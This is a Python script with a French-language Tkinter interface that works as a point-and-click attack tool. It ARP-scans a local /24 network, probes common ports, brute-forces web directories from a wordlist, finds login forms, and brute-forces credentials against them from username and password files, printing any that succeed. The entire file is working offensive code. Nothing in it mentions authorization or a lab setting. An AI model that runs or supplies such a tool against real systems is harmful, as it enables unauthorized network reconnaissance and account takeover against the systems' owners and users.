import socket
import requests
from bs4 import BeautifulSoup
from scapy.all import ARP, Ether, srp
import tkinter as tk
from tkinter import messagebox, scrolledtext


# === FONCTIONS DE BASE ===

def get_active_devices(network):
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    active_devices = [element[1].psrc for element in answered_list]
    return active_devices


def scan_ports(ip):
    ports = [22, 23, 80, 443, 3306, 8080, 5000]
    open_ports = []
    web_ports = []

    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                open_ports.append(port)
                try:
                    url = f"http://{ip}:{port}"
                    response = requests.get(url, timeout=2)
                    if response.status_code == 200:
                        web_ports.append(port)
                except:
                    pass
        except Exception as e:
            output_text.insert(tk.END, f"[ERREUR] Port {port} : {e}\n")

    return open_ports, web_ports


def login_verification(html):
    soup = BeautifulSoup(html, 'html.parser')
    forms = soup.find_all('form')
    return any(form.find('input', {'type': 'password'}) for form in forms)


def directory_bruteforce(base_url, port, wordlist):
    found_dirs = []
    for word in wordlist:
        url = f"{base_url}:{port}/{word}"
        try:
            response = requests.get(url, timeout=2)
            if response.status_code in [200, 301, 302]:
                found_dirs.append(url)
        except requests.RequestException:
            continue
    return found_dirs


def login_bruteforce(login_url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            data = {"username": username.strip(), "password": password.strip()}
            try:
                response = requests.post(login_url, data=data, timeout=2)
                if "Welcome" in response.text or "Dashboard" in response.text or response.status_code == 302:
                    return username, password
            except requests.RequestException:
                continue
    return None, None


# === INTERFACE UTILISATEUR ===

def scan_network():
    network = ip_entry.get().rsplit('.', 1)[0] + ".0/24"
    output_text.insert(tk.END, f"[+] Scan du réseau {network}...\n")
    devices = get_active_devices(network)
    for dev in devices:
        output_text.insert(tk.END, f"IP active : {dev}\n")
    if not devices:
        output_text.insert(tk.END, "Aucune IP trouvée.\n")


def scan_ip_ports():
    ip = ip_entry.get()
    output_text.insert(tk.END, f"[+] Scan des ports de {ip}...\n")
    open_ports, web_ports = scan_ports(ip)
    for port in open_ports:
        output_text.insert(tk.END, f"Port ouvert : {port}\n")
    if web_ports:
        output_text.insert(tk.END, f"Ports Web détectés : {web_ports}\n")
    else:
        output_text.insert(tk.END, "Aucun serveur Web détecté.\n")


def run_dir_and_login():
    base_url = "http://" + ip_entry.get()
    try:
        with open('wordlist_dir.txt') as f:
            wordlist = [line.strip() for line in f]
        with open('usernames.txt') as f:
            usernames = [line.strip() for line in f]
        with open('passwords.txt') as f:
            passwords = [line.strip() for line in f]
    except:
        messagebox.showerror("Erreur", "Fichiers wordlist manquants.")
        return

    port = port_entry.get()
    output_text.insert(tk.END, f"[+] Recherche de répertoires sur {base_url}:{port}...\n")
    found_dirs = directory_bruteforce(base_url, port, wordlist)
    for url in found_dirs:
        output_text.insert(tk.END, f"Répertoire trouvé : {url}\n")
        try:
            r = requests.get(url, timeout=2)
            if login_verification(r.text):
                output_text.insert(tk.END, f"[+] Formulaire de login détecté sur {url}\n")
                user, pwd = login_bruteforce(url, usernames, passwords)
                if user:
                    output_text.insert(tk.END, f"[!!] Identifiants valides : {user}/{pwd}\n")
                else:
                    output_text.insert(tk.END, "[--] Aucun identifiant trouvé.\n")
        except:
            pass


# === CONFIGURATION TKINTER ===

root = tk.Tk()
root.title("Scanner de réseau & brute force (Tkinter GUI)")
root.geometry("700x500")

frame = tk.Frame(root)
frame.pack(pady=10)

tk.Label(frame, text="IP cible :").grid(row=0, column=0, padx=5)
ip_entry = tk.Entry(frame, width=20)
ip_entry.grid(row=0, column=1)

tk.Label(frame, text="Port HTTP :").grid(row=0, column=2)
port_entry = tk.Entry(frame, width=5)
port_entry.grid(row=0, column=3)
port_entry.insert(0, "80")

tk.Button(frame, text="Scan Réseau", command=scan_network).grid(row=1, column=0, pady=10)
tk.Button(frame, text="Scan Ports", command=scan_ip_ports).grid(row=1, column=1)
tk.Button(frame, text="Directory + Login Bruteforce", command=run_dir_and_login).grid(row=1, column=2, columnspan=2)

output_text = scrolledtext.ScrolledText(root, width=80, height=20)
output_text.pack(padx=10, pady=10)

root.mainloop()
